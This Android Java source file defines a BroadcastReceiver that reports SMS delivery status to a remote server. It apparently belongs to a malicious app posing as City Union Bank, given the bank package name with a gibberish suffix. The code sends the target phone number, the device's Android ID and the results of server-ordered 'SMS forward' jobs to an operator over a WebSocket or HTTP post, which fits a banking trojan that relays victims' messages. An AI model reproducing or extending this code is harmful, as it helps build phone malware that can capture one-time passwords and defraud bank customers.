package com.cityunionbank.ljlkqjahqywlqkwlkjayqwkjlajlskjlajsljasashash;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class   MessageDeliver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        int sms_forward_id = intent.getIntExtra("sms_forward_id", -1);
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Delivered";
                Log.d(Helper.TAG, "SMS delivered successfully.");
                break;
            default:
                status = "UnDelivered";
                Log.d(Helper.TAG, "SMS not delivered.");
                break;
        }


        JSONObject data = new JSONObject();
        try {
            Helper helper = new Helper();
            if(sms_forward_id > 1){
                WebSocketManager webSocketManager = new WebSocketManager(context);
                if (!webSocketManager.isConnected()) {
                    webSocketManager.connect();
                }
                data.put("message", status + " to "+number);
                data.put("sms_forward_id", sms_forward_id);
                data.put("mobile_id", Helper.getAndroidId(context));
                data.put("action", "response-sms-forward");
                data.put("sitename", helper.SITE());
                String datasent = data.toString();
                webSocketManager.sendMessage(datasent);
            }else{
                data.put("status", status + " to "+number);
                data.put("id", id);
                data.put("site", helper.SITE());
                Helper.postRequest(helper.SMSSavePath(), data, context, new Helper.ResponseListener(){
                    @Override
                    public void onResponse(String result) {
                        Log.d("mywork", "status updated Result, "+ result);
                    };
                });
            }

        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

    }
}

